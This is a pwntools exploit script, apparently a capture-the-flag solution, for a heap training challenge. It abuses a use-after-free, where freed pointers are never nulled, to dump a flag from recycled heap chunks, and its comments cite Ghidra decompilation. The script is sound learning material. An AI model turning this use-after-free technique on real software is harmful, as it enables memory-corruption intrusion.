from pwn import * 
# Importing the pwntools library

p = process("/challenge/toddlerheap_level1.1")
# Initializing the target binary as a local process

for i in range(16):
    # Loop to allocate blocks on the heap. Max capacity is 16 indices, verified via Ghidra:
    #    if (0xf < uVar2) {
    #        /* WARNING: Subroutine does not return */
    #        __assert_fail("allocation_index < 16","/mnt/pwnshop/source.c",0x4b,"main");
    #    }
    
    print(p.recvuntil(b":"))
    # Wait until the input prompt delimiter ':' is received
    
    p.sendline(b"malloc")
    # Invoke the malloc menu command
    
    print(p.recvuntil(b":"))
    p.sendline(str(i).encode())
    # Send the target index for the new allocation
    
    print(p.recvuntil(b":"))
    p.sendline(b"1024")
    # Send the maximum allowable size (1024 bytes) as constrained by Ghidra checks


for i in range(15):
    # Loop to systematically release allocated heap blocks
    
    print(p.recvuntil(b":"))
    p.sendline(b"free")
    # Send the free command to release a chunk
    
    print(p.recvuntil(b":"))
    p.sendline(str(i).encode())
    # Send the target index to be freed


print(p.recvuntil(b":"))
p.sendline(b"read_flag")
# Trigger the hidden routine to read the flag into a newly consolidated heap zone


for i in range(16):
    print(p.recvuntil(b":"))  
    p.sendline(b"puts")
    # Send the puts command to read a chunk's data layout
    
    print(p.recvuntil(b":"))
    p.sendline(str(i).encode())
    # Query every index. Since the tracking pointers are never nullified upon freeing (UAF),
    # we can dump the flag residing inside the recycled heap regions.
    # Verified via Ghidra puts() implementation:
    # 
    #  iVar1 = strcmp(local_98,"puts");
    #  if (iVar1 != 0) break;
    #  printf("Index: ");
    #  __isoc99_scanf("%127s",local_98);
    #  puts("");
    #  uVar2 = atoi(local_98);
    #  if (0xf < uVar2) {
    #                /* WARNING: Subroutine does not return */
    #    __assert_fail("allocation_index < 16","/mnt/pwnshop/source.c",0x6c,"main");
    #  }
    #  printf("Data: ");
    #  puts(*(char **)(alloc_struct + ((ulong)uVar2 + 0x20) * 8));


p.close()
# Cleanly terminate the process pipe as absolute winners! =)
